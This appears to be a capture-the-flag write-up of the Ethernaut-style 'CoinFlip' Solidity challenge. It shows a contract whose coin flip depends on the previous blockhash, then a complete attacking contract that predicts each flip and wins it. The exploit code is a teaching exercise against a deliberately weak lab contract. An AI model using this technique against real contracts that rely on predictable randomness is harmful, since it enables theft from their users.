## CoinFlip Challenge

### The Goal of this challenge is to find the correct answer within the two flips 10 times consecutively!

Smart Contract: 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }

}
```
#### Problem Approach: 

- We want to hack this smart contract by sending a malicious transaction to it by creating another smart contract. So let's go ahead and do that.

- In the first part i will pick up the FACTOR state variable from the contract itself so that the functions execute correctly.

- Next I will create a constructor and pass in the contract address in the targetted contract variable so that we can call functions on the contract we want to hack.

- 

```
contract HackCoinFlip {

uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
CoinFlip private immutable target;

constructor(address _target) {
    target = CoinFlip(_target);
}

}
```

- Now Let's copy the code that chooses the side and the guess and return the guess in a new function in our Hack Contract.

```
function guess() private view returns(bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return side;
}
```

- This will either return true or false but the way we are going to hack the contract is us running a require statement that will only be executed when the returned side is true.

- So let's write a new function called flip and call the flip function from the contract we want to hack and implement the hacking.

```
function flip() external {
    bool _guess = guess();
    require(target.flip(_guess) == true, "RETURNED WRONG GUESS!!!");
}
```
And there you have it! If you were to call this function it would always return the correct guess.


### Another approach idea, What if we kept sending true and got true everytime???